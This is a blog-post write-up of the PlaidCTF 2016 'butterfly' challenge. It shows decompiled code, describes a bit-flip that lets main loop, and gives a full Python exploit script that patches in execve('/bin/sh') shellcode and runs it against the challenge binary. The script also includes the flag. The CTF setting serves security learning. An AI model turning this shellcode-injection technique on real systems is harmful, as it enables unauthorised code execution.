---
layout: post
title: pctf 2016 butterfly writeup
category: writeup
---


with disassembler, I can get pseudocode like

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  signed int v3; // er14@1
  __int64 v4; // rax@2
  char v5; // bl@2
  __int64 v6; // rbp@2
  unsigned __int64 v7; // r15@2
  __int64 v8; // rax@5
  char v10; // [sp+0h] [bp-68h]@1
  __int64 v11; // [sp+40h] [bp-28h]@1

  v11 = *MK_FP(__FS__, 40LL);
  setbuf(_bss_start, 0LL);
  puts("THOU ART GOD, WHITHER CASTEST THY COSMIC RAY?");
  v3 = 1;
  if ( fgets(&v10, 50, stdin) )
  {
    v4 = strtol(&v10, 0LL, 0);
    v5 = v4;
    v6 = v4 >> 3;
    v7 = (v4 >> 3) & 0xFFFFFFFFFFFFF000LL;
    if ( mprotect((void *)v7, 0x1000uLL, 7) )
    {
      perror("mprotect1");
    }
    else
    {
      v3 = 1;
      *(_BYTE *)v6 ^= 1 << (v5 & 7);
      if ( mprotect((void *)v7, 0x1000uLL, 5) )
      {
        perror("mprotect2");
      }
      else
      {
        puts("WAS IT WORTH IT???");
        v3 = 0;
      }
    }
  }
  v8 = *MK_FP(__FS__, 40LL);
  if ( *MK_FP(__FS__, 40LL) == v11 )
    LODWORD(v8) = v3;
  return v8;
}
```

so this program get one integer, and xor one specific bits.
I choose one address to change stack operation

> .text:0000000000400860                 add     rsp, 48h | 48 83 C4 48

to

> .text:0000000000400860                 add     rsp,  8h | 48 83 C4 08

so i can control return address. (goto main and loop this thing)

and next thing is easy: overwrite any address to shellcode and execute it.

my exploit code:

```python
import pwnbox
import struct

# PCTF{b1t_fl1ps_4r3_0P_r1t3}

local = True

main_ = 0x400788
libc_init = 0x400890
if local:
    p = pwnbox.pipe.ProcessPipe('gdb -q butterfly_33e86bcc2f0a21d57970dc6907867bed')
else:
    p = pwnbox.pipe.SocketPipe('butterfly.pwning.xxx',9999)

first_point = (0x400863) << 3 | 6

def xor_code(addr,pos):
    p.read_until('RAY?')
    p.write(('%d' % ((addr << 3) | pos)).ljust(40,'A') + struct.pack('<Q',main_) + '\n')

def xor_byte(addr,byte):
    for i in range(8):
        if byte & 1 :
            xor_code(addr,i)
        byte /= 2

def change_byte(addr,orig,new):
    xor_byte(addr,orig)
    xor_byte(addr,new)

def change_bytes(addr,orig_bytes,new_bytes):
    for i in range(len(orig_bytes)):
        change_byte(addr+i, struct.unpack('<B',orig_bytes[i])[0], struct.unpack('<B',new_bytes[i])[0])


if local:
    p.read_until('(gdb)')
    #p.write('b *0x400860\n')
    p.write('r\n')


p.read_until('RAY?')
p.write(('%d'%first_point).ljust(40,'A') + struct.pack('<Q',main_)+'\n')
change_bytes(libc_init,'415741564189FF415541544C8D251602200055488D2D1602200053'.decode('hex'),'31c048bbd19d9691d08c97ff48f7db53545f995257545eb03b0f05'.decode('hex'))

p.read_until('RAY?')
p.write(('%d'%(0x40086B << 3 | 0)).ljust(40,'A') + struct.pack('<Q',libc_init) + '\n')
p.interact()
```
